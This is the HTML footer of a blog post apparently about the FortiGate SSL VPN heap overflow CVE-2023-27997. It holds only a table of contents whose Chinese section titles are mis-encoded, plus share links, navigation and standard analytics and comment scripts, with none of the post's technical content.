        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">æ¼æ´ç¯å¢ƒæ­å»º</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">æ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">æ¼æ´åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E8%AF%AD"><span class="toc-number">3.1.</span> <span class="toc-text">åˆ©ç”¨åŸè¯­</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%B8%83%E5%B1%80"><span class="toc-number">3.2.</span> <span class="toc-text">å †å¸ƒå±€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">3.3.</span> <span class="toc-text">æ ˆè¿ç§»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E6%8C%87%E4%BB%A4"><span class="toc-number">3.4.</span> <span class="toc-text">æ‰§è¡Œä»»æ„æŒ‡ä»¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">4.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number">5.</span> <span class="toc-text">Reference link</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&text=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&is_video=false&description=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow&body=Check out this article: https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&name=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&t=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
